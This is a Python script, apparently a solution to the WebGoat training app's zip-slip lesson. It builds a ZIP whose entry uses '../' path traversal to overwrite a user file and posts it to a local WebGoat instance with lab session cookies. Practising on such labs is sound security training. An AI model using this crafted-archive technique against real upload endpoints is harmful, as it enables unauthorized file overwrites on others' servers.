import zipfile

from werkzeug.datastructures.file_storage import FileStorage
from werkzeug.test import encode_multipart
import io
import http.client


def POST_WebGoat_PathTraversal_zipslip() -> http.client.HTTPResponse:
    method, path = 'POST', '/WebGoat/PathTraversal/zip-slip'
    host, port = 'localhost', 8080
    headers = {
        'Host': 'localhost:8080',
        'User-Agent': 'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/118.0',
        'Accept': '*/*',
        'Accept-Language': 'en-US,en;q=0.5',
        'Accept-Encoding': 'gzip, deflate, br',
        'X-Requested-With': 'XMLHttpRequest',
        'Content-Type': 'multipart/form-data; boundary=---------------------------7522261121787605528742283672',
        'Origin': 'http://localhost:8080',
        'Connection': 'keep-alive',
        'Referer': 'http://localhost:8080/WebGoat/start.mvc?username=testuser1',
        'Cookie': 'hijack_cookie=8526824206571018870-1712961702743; JSESSIONID=oWBt2iLW7c4BTp-gk3pyLYngjcdNeBm4jKglBIcy',
        'Sec-Fetch-Dest': 'empty',
        'Sec-Fetch-Mode': 'cors',
        'Sec-Fetch-Site': 'same-origin',
    }
    fields = {
        'fullName': 'test',
        'email': 'test@test.com',
        'password': 'test',
    }
    zip_io = io.BytesIO()
    zip_file = zipfile.ZipFile(zip_io, 'w', zipfile.ZIP_DEFLATED)
    zip_file.writestr(
        zinfo_or_arcname='../../../../home/greg/.webgoat-2023.9-SNAPSHOT/PathTraversal/testuser1/testuser1.jpg',
        data=open('cat.jpg', 'rb').read(),
    )
    zip_file.close()
    zip_io.seek(0)
    zip_io.seek(0)
    files = {
        'uploadedFileZipSlip': {
            'filename': 'cat.zip',
            'content_type': 'application/zip',
            'content': zip_io,
        },
    }
    _, body = encode_multipart(
        boundary='---------------------------7522261121787605528742283672',
        values={
                   field_name: field_value
                   for field_name, field_value in fields.items()
               } | {
                   field_name: FileStorage(
                       filename=file['filename'],
                       content_type=file['content_type'],
                       stream=file['content'],
                   ) for field_name, file in files.items()
               },
    )
    headers['Content-Length'] = str(len(body))
    connection = http.client.HTTPConnection(host, 27001)
    connection.set_tunnel(host, port)
    connection.request(method, path, body, headers)
    return connection.getresponse()


response = POST_WebGoat_PathTraversal_zipslip()
print(response.read())
